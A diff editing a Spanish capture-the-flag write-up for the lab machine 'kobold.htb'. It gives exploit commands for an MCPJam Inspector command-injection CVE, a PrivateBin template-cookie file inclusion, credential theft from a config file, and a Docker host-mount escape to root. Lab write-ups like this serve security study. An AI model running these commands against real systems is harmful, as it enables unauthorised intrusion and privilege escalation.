@@ -17,7 +17,7 @@ tags: [linux, mcp, cve-2026-23744, privategin, docker, container-escape]
 
 ## TL;DR
 
-Tres servicios modernos: **MCPJam Inspector** (visor de servidores MCP), un **PrivateBin** y un panel de Docker (**Arcane**). El inspector tiene **CVE-2026-23744**: `/api/mcp/connect` pasa el campo `command` a `child_process.spawn()` sin autenticación, así que un JSON da shell como `ben`. Desde ahí, el grupo `operator` permite escribir en un directorio que PrivateBin monta, y su LFI de plantillas (**CVE-2025-64714**) ejecuta el PHP; las credenciales del `conf.php` abren Arcane como admin, y un contenedor privilegiado con `/` montado remata el box.
+Tres servicios modernos: **MCPJam Inspector 1.4.2** (visor de servidores MCP), **PrivateBin 2.0.2** y **Arcane 1.13.0** (gestión de Docker). El inspector tiene **CVE-2026-23744** (corregida en 1.4.3): `/api/mcp/connect` pasa el campo `command` a `child_process.spawn()` sin autenticación, así que un JSON da shell como `ben`. Desde ahí, el grupo `operator` escribe en el directorio de datos que PrivateBin monta en su contenedor, y su LFI de plantillas (**CVE-2025-64714**, 1.7.7–2.0.2, parcheada en 2.0.3) ejecuta el PHP vía cookie `template`; la configuración del panel filtra credenciales que abren Arcane como admin, y un contenedor privilegiado con `/` montado remata el box.
 
 ## Reconocimiento
 
@@ -28,13 +28,13 @@ ffuf -u http://<IP> -H "Host: FUZZ.kobold.htb" -w subdomains.txt -mc 200,403
 
 ```text
 22/tcp    ssh
-80/tcp    http   (vhosts)
+80/tcp    http   nginx (vhosts)
 3552/tcp  http   Arcane (gestión Docker)
 ```
 
 ```text
-mcp.kobold.htb    -> MCPJam Inspector
-bin.kobold.htb    -> PrivateBin
+mcp.kobold.htb  -> MCPJam Inspector  (127.0.0.1:6274, sólo HTTPS a través de nginx)
+bin.kobold.htb  -> PrivateBin 2.0.2   (127.0.0.1:8080, contenedor)
 ```
 
 ## Enumeración
@@ -45,16 +45,16 @@ grep -E "ben|operator|docker" /etc/group
 ```
 
 ```text
-operator:x:1001:ben
-docker:x:998:ben
+operator:x:37:ben
+docker:x:111:alice
 ```
 
-Dos caminos según lo que haya activo en la sesión; los grupos suplementarios no siempre se cargan en una shell nueva.
+Ojo: `id` muestra `operator` (37) pero **no** `docker`, porque la pertenencia está en `/etc/gshadow`. Tras enumerar el fichero, `newgrp docker` activa el grupo en la shell actual; sin ese paso el `docker run` falla con *permission denied*.
 
 ## Foothold
 
 ```bash
-curl -s -X POST http://mcp.kobold.htb/api/mcp/connect \
+curl -sk -X POST https://mcp.kobold.htb/api/mcp/connect \
   -H 'Content-Type: application/json' \
   -d @- <<'JSON'
 {
@@ -81,17 +81,17 @@ uid=1000(ben) gid=1000(ben) groups=1000(ben)
 ## Escalada de privilegios
 
 ```bash
-ls -ld /opt/privatebin/data /opt/privatebin/tpl
-# escribible por el grupo operator
+ls -ld /privatebin-data/data
+# drwxrwx--- operator  -> escribible por el grupo
 ```
 
-Se deja un `.php` en el directorio montado y se invoca la plantilla:
+Ese directorio del host está montado dentro del contenedor de PrivateBin, y el `php -S` del contenedor sirve desde ahí. Se deja un `.php` y se pide como plantilla mediante la **cookie** `template`, que se resuelve de forma relativa a `tpl/`:
 
 ```bash
-curl -s "http://bin.kobold.htb/?tpl=../../data/<fichero>" -o /dev/null
+curl -s --cookie "template=../../data/<fichero>" http://bin.kobold.htb/
 ```
 
-El LFI de plantillas (CVE-2025-64714) incluye el fichero y ejecuta el código. Con la shell, se lee la configuración:
+El LFI (CVE-2025-64714) incluye el fichero y ejecuta el código **dentro del contenedor**. Con esa shell se lee la configuración, y de ahí salen las credenciales de Arcane:
 
 ```bash
 cat /opt/privatebin/cfg/conf.php | grep -i -A2 "arcane\|password"
@@ -108,7 +108,7 @@ docker run -v /:/host --rm -it alpine chroot /host bash
 root@kobold:/# cat /root/root.txt
 ```
 
-En Arcane el equivalente es crear un contenedor privilegiado con el volumen del host y entrar en él.
+En Arcane el equivalente es entrar como admin (`admin`/`<password>`) y crear un contenedor privilegiado con el volumen del host montado. Si el login no está accesible, Arcane 1.13.0 tiene además un *bypass* de autenticación (**CVE-2026-23944**) y un SSRF en `/templates/fetch` (**CVE-2026-40242**).
 
 ## Evidencia
 
